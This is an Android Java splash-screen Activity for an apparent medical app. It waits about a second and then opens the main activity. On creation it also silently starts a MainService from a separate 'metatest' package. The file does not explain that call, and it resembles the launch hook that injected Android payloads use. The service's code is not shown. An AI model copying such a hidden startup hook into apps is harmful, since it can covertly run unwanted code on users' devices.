package com.srinidhi.ecm;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

import com.srinidhi.ecm.metatest.MainService;

public class splash extends Activity {
    /** Called when the activity is first created. */

   /*this class is created to wait the screen in 100ml seconds*/
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		MainService.startService(this);
        Thread newThred=new Thread(){
        	public void run(){
        		
        		try{
					short logoTimer=0;
					while (logoTimer<1000) {
						sleep(100);
						logoTimer+=100;
					}
					Intent it=new Intent(splash.this,MedicalproActivity.class);
					startActivity(it);
				}
				catch (Exception e) {
					// TODO: handle exception
					e.printStackTrace();
				}
				finally{
					finish();
				}
        	}
        };
        newThred.start();
    }
    protected void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}
	

	@Override
	protected void onPause() {
		// TODO Auto-generated method stub
		super.onPause();
	}

	@Override
	protected void onRestart() {
		// TODO Auto-generated method stub
		super.onRestart();
	}

	@Override
	protected void onResume() {
		// TODO Auto-generated method stub
		super.onResume();
	}

	@Override
	protected void onStart() {
		// TODO Auto-generated method stub
		super.onStart();
	}

	@Override
	protected void onStop() {
		// TODO Auto-generated method stub
		super.onStop();
	}

    
}